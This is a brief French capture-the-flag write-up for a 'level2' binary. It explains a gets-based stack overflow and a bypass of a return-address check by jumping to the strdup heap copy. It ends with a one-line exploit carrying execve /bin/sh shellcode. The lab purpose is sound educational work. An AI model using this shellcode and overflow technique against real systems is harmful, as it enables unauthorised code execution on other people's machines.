@@ -1,0 +1,6 @@
+Quand on disass le binaire, on voit que la fonction main fait juste un appel a une autre fonction p. Lors du disas de celle ci, on voit qu'elle effectue un gets et que juste apres, elle verifie que l'adresse de retour de la fonction n'a pas ete modifiée (si elle commence par 0xb0).
+Ensuite, elle affiche la chaine saisie par gets, avant de la duplique via un strdup.
+Afin d'exploiter ce binaire, il va d'abord nous falloir un shellcode. En effet, ce binaire n'effectue aucune call a "/bin/sh" ou ouverture de shell par lui meme.
+Nous allons entrer le shellcode sur l'entré attendu par gets avec suffisament de A pour faire overflow le buffer, et modifier l'EIP par l'adresse de retour du strdup. Vu qu'elle ne commence par 0xb0, cela nous permet de contourner la securité mise en evidance plus tot.
+Cele nous donne l'exploit suivant : 
+(python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A" * 55 + "\x08\x04\xa0\x08"[::-1]'; cat) | ./level2
